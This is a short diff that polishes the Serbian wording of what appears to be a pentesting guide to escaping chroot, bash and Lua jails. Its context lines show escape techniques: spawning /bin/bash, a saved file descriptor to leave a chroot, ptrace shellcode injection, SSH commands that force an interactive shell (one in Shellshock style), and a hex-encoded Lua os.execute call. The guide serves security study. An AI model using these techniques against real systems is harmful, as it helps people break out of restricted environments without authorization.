@@ -76,7 +76,7 @@ system("/bin/bash");
 ```
 </details>
 
-### Root + Sačuvani fd
+### Root + Saved fd
 
 > [!WARNING]
 > Ovo je slično prethodnom slučaju, ali u ovom slučaju **napadač čuva deskriptor datoteke za trenutni direktorijum** i zatim **stvara chroot u novom folderu**. Na kraju, pošto ima **pristup** tom **FD** **izvan** chroot-a, pristupa mu i **beži**.
@@ -147,7 +147,7 @@ chroot(".");
 
 > [!WARNING]
 >
-> - Pre nekog vremena korisnici su mogli da debaguju svoje procese iz procesa samog sebe... ali to više nije moguće po default-u
+> - Pre neko vreme korisnici su mogli da debaguju svoje procese iz procesa samog sebe... ali to više nije moguće po default-u
 > - U svakom slučaju, ako je moguće, mogli biste ptrace u proces i izvršiti shellcode unutar njega ([vidi ovaj primer](linux-capabilities.md#cap_sys_ptrace)).
 
 ## Bash Jails
@@ -190,7 +190,7 @@ ssh -t user@<IP> bash # Get directly an interactive shell
 ssh user@<IP> -t "bash --noprofile -i"
 ssh user@<IP> -t "() { :; }; sh -i "
 ```
-### Deklarisati
+### Deklaracija
 ```bash
 declare -n PATH; export PATH=/bin;bash -i
 
@@ -231,7 +231,7 @@ Na ovoj stranici možete pronaći globalne funkcije kojima imate pristup unutar 
 ```bash
 load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
 ```
-Neki trikovi za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
+Nekoliko trikova za **pozivanje funkcija biblioteke bez korišćenja tačaka**:
 ```bash
 print(string.char(0x41, 0x42))
 print(rawget(string, "char")(0x41, 0x42))
